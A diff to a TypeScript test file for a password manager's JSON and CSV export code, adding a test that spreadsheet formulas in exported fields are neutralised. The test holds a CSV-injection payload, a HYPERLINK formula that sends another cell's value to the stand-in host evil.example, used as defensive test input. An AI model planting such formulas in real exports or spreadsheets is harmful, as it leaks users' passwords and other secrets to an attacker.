@@ -42,7 +42,7 @@ describe('MelonApp export payload', () => {
     const json = melonPayload(items, names, new Date('2026-11-12T10:00:00Z'));
     expect(JSON.parse(json)).toMatchObject({ app: 'MelonApp', version: 1, exportedAt: '2026-11-12T10:00:00.000Z' });
     expect(JSON.parse(json).items.map((i: { vault: string }) => i.vault)).toEqual(['Persönlich', 'Familie']);
-    expect(parseMelonPayload(json)).toEqual(items.map((i) => i.item));
+    expect(parseMelonPayload(json)).toEqual(items.map((i) => ({ ...i.item, seq: 0 })));
   });
 
   it('rejects files that are not a MelonApp export', () => {
@@ -75,6 +75,15 @@ describe('CSV export', () => {
     expect(first).toMatch(/^Persönlich,,login,/);
     expect(csv).toMatch(/Persönlich,,note,Visa,,Kartennummer: 4111 1111 1111 1111,0,,,,/);
     expect(second).toBeDefined();
+  });
+
+  it('neutralises spreadsheet formulas everywhere except in password and 2FA columns', () => {
+    const item = login();
+    item.title = '=HYPERLINK("https://evil.example/?"&J2,"Bank")';
+    const csv = bitwardenCsv([vault(item)], () => '+Familie');
+    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?""&J2,""Bank"")"`);
+    expect(csv).toContain("'+Familie");
+    expect(fieldValue(parseCsvExport(csv).items[0]!, 'password')).toBe('=p,a"ss\nword');
   });
 
   it('marks unencrypted files in their name', () => {
